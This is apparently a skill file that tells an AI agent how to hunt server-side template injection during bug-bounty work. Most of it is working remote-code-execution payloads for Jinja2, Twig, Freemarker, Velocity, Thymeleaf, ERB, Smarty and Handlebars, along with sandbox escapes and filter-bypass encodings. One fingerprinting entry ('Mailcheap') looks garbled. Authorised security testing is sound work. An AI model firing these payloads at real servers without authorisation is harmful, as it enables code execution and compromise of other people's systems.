---
name: hunt-ssti
description: Server-side template injection — Jinja2, Twig, Freemarker, Velocity, Thymeleaf, ERB, Razor, Smarty, Handlebars.
keywords: [ssti, server-side template injection, jinja, twig, freemarker, velocity, thymeleaf, erb, razor, smarty, handlebars]
---

# hunt-ssti

## When this skill loads

Triggers: "ssti", "template injection", "jinja", "twig", "freemarker",
"velocity", "thymeleaf", "erb", "razor".

## Phase 1 — detect

Probe with multi-engine polyglot:

```
${{<%[%'"}}%\
```

Then specific arithmetic to fingerprint:

| Payload | Renders as | Engine |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2 / Twig / Liquid |
| `${7*7}` | `49` | Freemarker / Thymeleaf (legacy) / Velocity |
| `<%= 7*7 %>` | `49` | ERB / EJS |
| `#{7*7}` | `49` | Pug / Mailcheap / Ruby string interp |
| `@(7*7)` | `49` | Razor |
| `{7*7}` | `49` | Smarty |
| `{{7*'7'}}` | `7777777` (Jinja) or `49` (Twig) | distinguishes Jinja from Twig |

Reflection points: error pages with template fallback, email
templates with user-controlled name, WYSIWYG editors with `{{var}}`
exposed, Slack-app slash-command bots, label printers, customer-
support macros.

## Phase 2 — Jinja2 (Python, Flask)

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate() }}
```

Class index `[396]` varies by Python version; use:

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Find `<class 'subprocess.Popen'>` → use its index. Or:

```jinja
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.exec('import os; print(os.popen("id").read())') }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

Sandbox bypass (when `SandboxedEnvironment` used):

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```

## Phase 3 — Twig (PHP, Symfony)

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ['id']|filter('system') }}
{{ {1:2}|sort('system')|join('||') }}
```

(Recent Twig versions removed `_self.env` from sandbox; check version.)

## Phase 4 — Freemarker (Java)

```ftl
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
${"freemarker.template.utility.Execute"?new()("id")}
${object?api.class.protectionDomain.codeSource}
```

## Phase 5 — Velocity (Java)

```velocity
#set($e="exp")
#set($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
$a.getInputStream()
```

## Phase 6 — Thymeleaf (Java Spring)

Spring expression injection in `th:utext`:

```
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

CVE-2017-1000486 / Spring4Shell adjacent surfaces.

## Phase 7 — ERB (Ruby)

```erb
<%= `id` %>
<%= system('id') %>
<%= Kernel.exec('id') %>
```

Sandbox via `ERB.new(template, trim_mode: '-')` doesn't sandbox at
all — purely formatting.

## Phase 8 — Smarty (PHP)

```smarty
{php}system('id');{/php}    (<= 3.1.32)
{system('id')}              (Smarty-aware filter abuse)
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id');?>",self::clearConfig())}
```

## Phase 9 — Handlebars (JS, Node)

```handlebars
{{#with "s" as |string|}}
  {{#with split as |conslist|}}
    {{this.pop}}
    {{this.push (lookup string.sub "constructor")}}
    {{this.pop}}
    {{#with string.split as |codelist|}}
      {{this.pop}}
      {{this.push "return require('child_process').execSync('id');"}}
      {{this.pop}}
      {{#each conslist}}
        {{#with (string.sub.apply 0 codelist)}}
          {{this}}
        {{/with}}
      {{/each}}
    {{/with}}
  {{/with}}
{{/with}}
```

(Long-form Doyensec-style payload.)

## Filter / sandbox bypasses

| Filter | Bypass |
|---|---|
| Blocks `__class__` | `["__class__"]` indexing, `attr("__class__")` |
| Blocks `popen`, `system` | `os.spawnl`, `subprocess.check_output`, `commands.getoutput` |
| Blocks dots | `request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")` |
| Blocks underscores | `\x5f\x5fclass\x5f\x5f`, base64-decoded names |

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #125980 (Uber) | Jinja2 SSTI in greeting → RCE |
| H1 #514877 | Twig in email template → RCE on bug bounty platform |
| CVE-2022-22963 (Spring Cloud Function) | SpEL injection in function header |
| CVE-2022-22965 (Spring4Shell) | Class.module property binding → RCE |
| CVE-2024-21626 (runc) — not SSTI but illustrative chain | |
| CVE-2024-23897 (Jenkins) | Args from URL → CLI command + file read |

## Never-submit fallbacks

- `{{7*7}}` rendering as `49` in a **client-side** template (Vue,
  Angular) — that's just CSTI, much lower impact.
- SSTI in a self-only context (you templating your own profile to
  yourself) → DOWNGRADE unless chained.

## See also

- `hunt-rce` — SSTI is one path; OS command injection adjacent
- `hunt-deserialization` — Java SSTI often co-located with Java deser
- `docs/verification/phase2f` — full SSTI+OAuth+file-upload chain lab
